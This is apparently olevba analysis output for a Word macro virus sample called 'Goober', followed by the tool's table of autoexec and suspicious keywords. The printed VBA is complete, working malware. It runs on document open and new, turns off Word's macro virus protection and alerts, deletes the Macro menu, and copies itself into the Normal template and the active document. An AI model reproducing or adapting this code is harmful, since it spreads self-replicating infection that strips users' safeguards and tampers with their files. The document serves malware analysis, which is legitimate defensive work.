olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Goober
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Goober - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function SetCursorPos Lib "USER32" _
        (ByVal x As Long, ByVal y As Long) As Long

Private Declare Function GetCursorPos Lib "USER32" _
        (lpPoint As Punkt) As Long

Private Type Punkt
           xAchse As Long
           yAchse As Long
 End Type

Private Declare Sub Sleep Lib "kernel32" _
        (ByVal dwMilliseconds As Long)
Private Sub document_Open(): On Error Resume Next:

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.ConfirmConversions = (0 - 0)
Options.SaveNormalPrompt = (1 - 1)
Options.VirusProtection = (2 - 2)
CommandBars("Tools").Controls("Macro").Delete

Open "C:\G00ber.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName

Set myRange = ActiveDocument.Range(Start:=0, End:=0)
With myRange.Find
    .ClearFormatting
    .Text = "ShiThe!"
    With .Replacement
        .ClearFormatting
        .Text = "The"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=True, _
        MatchWholeWord:=True
End With

With myRange.Find
    .ClearFormatting
    .Text = "shithe!"
    With .Replacement
        .ClearFormatting
        .Text = "the"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=True, _
        MatchWholeWord:=True
End With


End Sub
Private Sub document_New(): On Error Resume Next:

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.ConfirmConversions = (0 - 0)
Options.SaveNormalPrompt = (1 - 1)
Options.VirusProtection = (2 - 2)
CommandBars("Tools").Controls("Macro").Delete

Open "C:\G00ber.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName
    
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_New        |Runs when a new Word document is created     |
|AutoExec  |document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

